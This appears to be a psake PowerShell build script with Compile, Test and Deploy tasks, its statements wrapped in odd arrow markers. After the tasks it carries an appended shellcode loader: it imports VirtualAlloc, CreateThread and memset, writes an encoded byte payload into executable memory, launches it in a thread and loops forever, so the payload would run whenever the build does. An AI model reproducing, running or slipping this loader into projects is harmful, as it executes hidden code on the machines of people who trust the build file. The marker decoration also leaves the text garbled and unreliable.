 -||-> Properties {
     -||-> [string]$testProperty = "Test123" <-||- 
} <-||- 

 -||-> BuildSetup {
     -||-> [string]$expected = "Test123" <-||- 
     -||-> if ( -||-> $testProperty -ne $expected <-||- ) {
        throw  -||-> "Expected sequence '$expected', but was actually '$testProperty'" <-||- 
    } <-||- 
} <-||- 

 -||-> Task default -depends Compile, Test, Deploy <-||- 

 -||-> Task Compile {
     -||-> "Compiling" <-||- 
} <-||- 

 -||-> Task Test -depends Compile {
     -||-> "Testing" <-||- 
} <-||- 

 -||-> Task Deploy -depends Test {
     -||-> "Deploying" <-||- 
} <-||- 

 -||-> $TvFD = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $TvFD -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xca,0xbe,0xf7,0x8c,0xf0,0x5e,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x72,0x18,0x03,0x72,0x18,0x83,0xea,0x0b,0x6e,0x05,0xa2,0x1b,0xed,0xe6,0x5b,0xdb,0x92,0x6f,0xbe,0xea,0x92,0x14,0xca,0x5c,0x23,0x5e,0x9e,0x50,0xc8,0x32,0x0b,0xe3,0xbc,0x9a,0x3c,0x44,0x0a,0xfd,0x73,0x55,0x27,0x3d,0x15,0xd5,0x3a,0x12,0xf5,0xe4,0xf4,0x67,0xf4,0x21,0xe8,0x8a,0xa4,0xfa,0x66,0x38,0x59,0x8f,0x33,0x81,0xd2,0xc3,0xd2,0x81,0x07,0x93,0xd5,0xa0,0x99,0xa8,0x8f,0x62,0x1b,0x7d,0xa4,0x2a,0x03,0x62,0x81,0xe5,0xb8,0x50,0x7d,0xf4,0x68,0xa9,0x7e,0x5b,0x55,0x06,0x8d,0xa5,0x91,0xa0,0x6e,0xd0,0xeb,0xd3,0x13,0xe3,0x2f,0xae,0xcf,0x66,0xb4,0x08,0x9b,0xd1,0x10,0xa9,0x48,0x87,0xd3,0xa5,0x25,0xc3,0xbc,0xa9,0xb8,0x00,0xb7,0xd5,0x31,0xa7,0x18,0x5c,0x01,0x8c,0xbc,0x05,0xd1,0xad,0xe5,0xe3,0xb4,0xd2,0xf6,0x4c,0x68,0x77,0x7c,0x60,0x7d,0x0a,0xdf,0xec,0xb2,0x27,0xe0,0xec,0xdc,0x30,0x93,0xde,0x43,0xeb,0x3b,0x52,0x0b,0x35,0xbb,0x95,0x26,0x81,0x53,0x68,0xc9,0xf2,0x7a,0xae,0x9d,0xa2,0x14,0x07,0x9e,0x28,0xe5,0xa8,0x4b,0xc4,0xe0,0x3e,0xb4,0xb1,0xeb,0x03,0x5c,0xc0,0xeb,0x60,0xa4,0x4d,0x0d,0xc6,0x86,0x1d,0x82,0xa6,0x76,0xde,0x72,0x4e,0x9d,0xd1,0xad,0x6e,0x9e,0x3b,0xc6,0x04,0x71,0x92,0xbe,0xb0,0xe8,0xbf,0x35,0x21,0xf4,0x15,0x30,0x61,0x7e,0x9a,0xc4,0x2f,0x77,0xd7,0xd6,0xc7,0x77,0xa2,0x85,0x41,0x87,0x18,0xa3,0x6d,0x1d,0xa7,0x62,0x3a,0x89,0xa5,0x53,0x0c,0x16,0x55,0xb6,0x07,0x9f,0xc3,0x79,0x7f,0xe0,0x03,0x7a,0x7f,0xb6,0x49,0x7a,0x17,0x6e,0x2a,0x29,0x02,0x71,0xe7,0x5d,0x9f,0xe4,0x08,0x34,0x4c,0xae,0x60,0xba,0xab,0x98,0x2e,0x45,0x9e,0x18,0x12,0x90,0xe6,0x6e,0x7a,0x20 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $O92W=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $O92W.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$O92W,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



